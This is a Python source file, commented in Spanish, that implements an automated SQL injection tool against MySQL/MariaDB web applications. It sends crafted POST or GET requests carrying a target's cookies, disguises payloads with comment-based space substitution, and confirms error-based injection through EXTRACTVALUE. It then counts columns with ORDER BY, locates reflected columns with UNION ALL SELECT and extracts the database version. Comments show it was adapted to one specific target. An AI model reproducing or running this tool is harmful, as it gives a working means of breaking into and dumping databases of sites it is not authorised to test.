import requests
import re
import time
import binascii

class MotorInyeccion:
    def __init__(self, config, callback=None):
        self.config = config
        self.callback = callback
        self.resultados_inspeccion = {
            "vulnerable": False,
            "dbms": None,
            "version": None,
            "error_detectado": None,
            "parametro_vulnerable": None,
            "union_columns": None,
            "union_visible_idx": None,
            "detalles": []
        }

    def _tamper(self, payload):
        metodo = self.config.get('tamper', 'space2comment')
        if metodo == 'space2comment':
            return payload.replace(" ", "/**/")
        return payload

    def _enviar_peticion(self, parametro, payload):
        # Notify callback (Sending Payload)
        if self.callback:
             self.callback("PAYLOAD", f"Testing {parametro}: {payload}")

        # Clonar data base
        data = self.config.get('post_data', {}).copy()
        
        # Inyectar en el parámetro objetivo
        data[parametro] = self._tamper(payload)
        
        headers = {
            "Host": self.config.get('host'),
            "Cookie": self.config.get('cookies'),
            "User-Agent": self.config.get('user_agent', 'Mozilla/5.0'),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": self.config.get('referer', '')
        }

        try:
            time.sleep(self.config.get('delay', 0.5))
            url = self.config.get('url')
            
            # Soporte básico para GET/POST (Asumimos POST por el contexto del usuario, pero extensible)
            if self.config.get('method', 'POST') == 'POST':
                response = requests.post(url, headers=headers, data=data, timeout=10)
            else:
                response = requests.get(url, headers=headers, params=data, timeout=10)
            
            # Notify callback (Response)
            if self.callback:
                 self.callback("DEBUG", f"Status: {response.status_code} | Len: {len(response.text)}")

            return response.text
        except Exception as e:
            if self.callback:
                 self.callback("ERROR", f"Request Failed: {e}")
            return None

    def _log_detalle(self, msg):
        self.resultados_inspeccion["detalles"].append(msg)
        if self.callback:
            self.callback("INFO", msg)

    def _extraer_version_union(self, param):
        """Extrae la versión usando UNION-BASED"""
        if not self.resultados_inspeccion.get("union_columns") or not self.resultados_inspeccion.get("union_visible_idx"):
            return

        self._log_detalle("Intentando extraer versión de la base de datos (UNION)...")
        
        cols = self.resultados_inspeccion["union_columns"]
        idx = self.resultados_inspeccion["union_visible_idx"]
        
        # Intentamos primero con @@version
        payload_cols = []
        for i in range(1, cols + 1):
            if i == idx:
                payload_cols.append("CONCAT(0x7e,@@version,0x7e)") # ~VERSION~
            else:
                payload_cols.append("11")
        
        ver_payload = f"-1 UNION ALL SELECT {','.join(payload_cols)}--"
        resp_ver = self._enviar_peticion(param, ver_payload)
        
        match_ver = re.search(r"~(.*?)~", resp_ver, re.DOTALL)
        if match_ver:
            self.resultados_inspeccion["version"] = match_ver.group(1)
            self._log_detalle(f"Versión extraída: {match_ver.group(1)}")
            return

        # Fallback: version()
        self._log_detalle("Retrying version extraction with version()...")
        payload_cols[idx-1] = "CONCAT(0x7e,version(),0x7e)"
        ver_payload_alt = f"-1 UNION ALL SELECT {','.join(payload_cols)}--"
        resp_ver_alt = self._enviar_peticion(param, ver_payload_alt)
        
        match_ver_alt = re.search(r"~(.*?)~", resp_ver_alt, re.DOTALL)
        if match_ver_alt:
            self.resultados_inspeccion["version"] = match_ver_alt.group(1)
            self._log_detalle(f"Versión extraída (Alt): {match_ver_alt.group(1)}")
        else:
            self.resultados_inspeccion["version"] = "Unknown (Union Extraction Failed)"

    def _detectar_union(self, param):
        """Intenta escalar a UNION SELECT"""
        self._log_detalle("🔎 Intentando escalar a UNION SELECT (Masivo)...")
        
        # 0. PRE-CHECK: Validar si ORDER BY es efectivo
        # Si ORDER BY 1 y ORDER BY 9999 dan lo mismo, no sirve de nada iterar.
        
        base_resp = self._enviar_peticion(param, "022")
        if not base_resp: return
        len_base = len(base_resp)
        
        # Check Low (Should work)
        resp_low = self._enviar_peticion(param, "022 ORDER BY 1--")
        
        # Check High (Should fail)
        resp_high = self._enviar_peticion(param, "022 ORDER BY 9999--")
        
        if not resp_low or not resp_high: return
        
        # Heurística:
        # 1. resp_low debe parecerse a base_resp (o ser válida)
        # 2. resp_high debe ser DIFERENTE a resp_low (error o vacía)
        
        diff_high = abs(len(resp_high) - len(resp_low))
        if diff_high < 50 and "SQL" not in resp_high:
            self._log_detalle(f"⚠️ 'ORDER BY' no parece afectar la respuesta en '{param}'. Saltando.")
            return

        # 1. Determinar número de columnas (ORDER BY)
        cols_count = 0
        
        # Estrategia: Buscar cambio drástico (Error o contenido vacío)
        for i in range(1, 50):
            # 022 ORDER BY i--
            payload = f"022 ORDER BY {i}--"
            resp = self._enviar_peticion(param, payload)
            
            # Si la respuesta es muy diferente (ej. error sql o longitud muy corta), nos pasamos
            # Comparar contra resp_low (que sabemos es válida)
            if not resp or "SQL syntax" in resp or "Unknown column" in resp or abs(len(resp) - len(resp_low)) > 500:
                 # Confirmar que el anterior (i-1) era válido
                 cols_count = i - 1
                 break
        
        if cols_count > 0:
            self._log_detalle(f"✅ Columnas detectadas (ORDER BY): {cols_count}")
            self.resultados_inspeccion["union_columns"] = cols_count
            
            # 2. Detectar columna visible (Reflejo)
            # Payload: 022 AND 1=0 UNION ALL SELECT 1,2,3,4...--
            # MEJORA: En lugar de marcadores HEX, usamos números simples primero para detectar visibilidad básica
            # como lo confirmó el usuario manualmente: UNION SELECT 1,2,3...
            
            # Construir payload: 1, 2, 3, ...
            # Pero necesitamos anular la query original. Usamos "022 AND 0" o "-1"
            
            payload_numbers = ",".join([str(x) for x in range(1, cols_count + 1)])
            
            # Intentamos primero con AND 0
            payload_union = f"022 AND 0 UNION ALL SELECT {payload_numbers}--"
            resp_union = self._enviar_peticion(param, payload_union)
            
            found_idx = None
            
            if resp_union:
                for i in range(1, cols_count + 1):
                    if re.search(f"[>\"']{i}[<\"']", resp_union):
                        found_idx = i
                        self._log_detalle(f"🎯 Columna visible encontrada: #{i}")
                        break
            
            if not found_idx:
                # Si falla con AND 0, intentamos con -1 (a veces ID negativo funciona mejor)
                payload_union_alt = f"-1 UNION ALL SELECT {payload_numbers}--"
                resp_union_alt = self._enviar_peticion(param, payload_union_alt)
                
                if resp_union_alt:
                    for i in range(1, cols_count + 1):
                        if re.search(f"[>\"']{i}[<\"']", resp_union_alt):
                             found_idx = i
                             self._log_detalle(f"🎯 Columna visible encontrada (Alt): #{i}")
                             break
            
            if found_idx:
                self.resultados_inspeccion["union_visible_idx"] = found_idx
                self._log_detalle("¡UNION-BASED INJECTION CONFIRMADA! (Dumpeo Masivo Disponible)")
                
                # UPDATE: Extract version immediately
                self._extraer_version_union(param)
                return

        else:
             self._log_detalle("⚠️ No se pudo determinar columnas para UNION.")

    def inspeccionar(self):
        """
        Realiza la inspección de vulnerabilidad en los parámetros configurados.
        """
        # Priorizar parámetro manual si existe
        target_manual = self.config.get('target_param')
        if target_manual:
            params = [target_manual]
            # Asegurarse que esté en post_data para que el envío funcione (si es POST)
            # Si no está, lo añadimos temporalmente con valor dummy
            if target_manual not in self.config.get('post_data', {}):
                 self.config.setdefault('post_data', {})[target_manual] = "1"
        else:
            params = self.config.get('post_data', {}).keys()
        
        # Modo Forzado
        force_mode = self.config.get('force_mode', None)
        
        for param in params:
            self._log_detalle(f"Analizando parámetro: {param}...")
            
            # --- FORCE UNION MODE ---
            if force_mode == 'union':
                self._log_detalle("🔒 Modo UNION forzado. Saltando pruebas de error-based.")
                self._detectar_union(param)
                
                # Si detectamos columnas union, marcamos vulnerable
                if self.resultados_inspeccion.get("union_columns"):
                    self.resultados_inspeccion["vulnerable"] = True
                    self.resultados_inspeccion["parametro_vulnerable"] = param
                    self.resultados_inspeccion["dbms"] = "MySQL / MariaDB (Inferido)"
                    self.resultados_inspeccion["error_detectado"] = "UNION-BASED INJECTION"
                    
                    return self.resultados_inspeccion
                else:
                    continue # Siguiente parametro

            # --- ERROR BASED TEST (Standard / Auto) ---
            # Payload: 1' AND EXTRACTVALUE(1, CONCAT(0x7e, 'TEST_INJ', 0x7e))-- 
            # Adaptado sin comillas para el caso específico del usuario
            payload_test = "022 AND EXTRACTVALUE(1,CONCAT(0x7e,0x544553545f494e4a,0x7e))--" 
            
            respuesta = self._enviar_peticion(param, payload_test)
            
            if respuesta:
                # Detección de Error
                if "XPATH syntax error" in respuesta:
                    self.resultados_inspeccion["vulnerable"] = True
                    self.resultados_inspeccion["parametro_vulnerable"] = param
                    self.resultados_inspeccion["error_detectado"] = "XPATH syntax error (MySQL/MariaDB Error-Based)"
                    self.resultados_inspeccion["dbms"] = "MySQL / MariaDB"
                    self._log_detalle("¡VULNERABILIDAD DETECTADA! El servidor respondió con un error SQL.")
                    
                    # Extraer Versión
                    self._log_detalle("Intentando extraer versión de la base de datos...")
                    payload_version = "022 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--"
                    resp_ver = self._enviar_peticion(param, payload_version)
                    
                    match_ver = re.search(r"XPATH syntax error: '~(.*?)~'", resp_ver)
                    if match_ver:
                        self.resultados_inspeccion["version"] = match_ver.group(1)
                        self._log_detalle(f"Versión extraída: {match_ver.group(1)}")
                    
                    # Intentar escalar a UNION (Si no es force error)
                    if force_mode != 'error':
                        self._detectar_union(param)
                    
                    return self.resultados_inspeccion # Terminar al encontrar
                
        self._log_detalle("Análisis finalizado. No se confirmaron vulnerabilidades con los payloads actuales.")
        return self.resultados_inspeccion
